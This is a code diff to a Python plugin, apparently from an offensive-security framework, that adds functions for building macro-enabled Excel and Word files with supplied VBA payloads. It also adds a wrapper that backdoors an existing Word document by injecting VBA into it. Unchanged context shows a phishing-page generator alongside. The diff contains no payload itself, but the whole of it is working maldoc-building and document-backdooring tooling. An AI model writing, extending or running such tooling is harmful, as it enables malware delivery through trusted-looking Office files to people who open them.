@@ -1441,6 +1441,80 @@ class PayloadMalDocsPlugin(ErebusPlugin):
     ) -> Path:
         return _create_phishing_page(output_path, brand, title, post_url, redirect_url)
 
+    # ------------------------------------------------------------------
+    # Builder-facing convenience wrappers
+    # ------------------------------------------------------------------
+
+    def _resolve_template_path(self, output_path: Path) -> Optional[Path]:
+        """Return an Excel template path for the given output file, or None."""
+        return _resolve_xl_template(output_path)
+
+    def _resolve_word_template_path(self, output_path: Path) -> Optional[Path]:
+        """Return a Word template path for the given output file, or None."""
+        ext = output_path.suffix.lower()
+        name = "template.docm" if ext == ".docm" else "template.docx"
+        repo_root = Path(__file__).resolve().parents[2]
+        candidates = [
+            repo_root / "agent_code" / "templates" / name,
+            Path(__file__).resolve().parent.parent / "templates" / name,
+        ]
+        for c in candidates:
+            if c.exists():
+                return c
+        return None
+
+    def create_new_excel_with_payload(
+        self,
+        output_path: Path,
+        vba_code: str,
+        document_name: str,
+        template_path: Optional[Path] = None,
+    ) -> Path:
+        """Create a new XLSM/XLAM from scratch (or a template) with the given VBA."""
+        out = Path(output_path)
+        out.parent.mkdir(parents=True, exist_ok=True)
+        is_addin = out.suffix.lower() == ".xlam"
+        vba_bin = self._compile_vba(vba_code, module_name=document_name)
+        if template_path and Path(template_path).exists():
+            data = _inject_vba_into_ooxml(Path(template_path).read_bytes(), vba_bin, "xl/vbaProject.bin")
+        else:
+            data = _build_xlsm_bytes(vba_bin, is_addin=is_addin)
+        out.write_bytes(data)
+        return out
+
+    def create_new_word_with_payload(
+        self,
+        output_path: Path,
+        vba_code: str,
+        document_name: str,
+        template_path: Optional[Path] = None,
+    ) -> Path:
+        """Create a new DOCM from scratch (or a template) with the given VBA."""
+        out = Path(output_path)
+        out.parent.mkdir(parents=True, exist_ok=True)
+        vba_bin = self._compile_vba(vba_code, module_name=document_name)
+        if template_path and Path(template_path).exists():
+            data = _inject_vba_into_ooxml(
+                Path(template_path).read_bytes(), vba_bin, "word/vbaProject.bin"
+            )
+        else:
+            data = _build_docm_bytes(vba_bin)
+        out.write_bytes(data)
+        return out
+
+    def backdoor_word_document(
+        self,
+        source_path: Path,
+        output_path: Path,
+        vba_code: str,
+    ) -> Path:
+        """Inject VBA into an existing Word document (DOCM/DOC/DOCX)."""
+        return self.backdoor_existing_word(
+            source_word=str(source_path),
+            vba_payload=vba_code,
+            output_path=str(output_path),
+        )
+
 
 # ---------------------------------------------------------------------------
 # Backward-compat alias: keep old plugin_payload_officedoc registration working
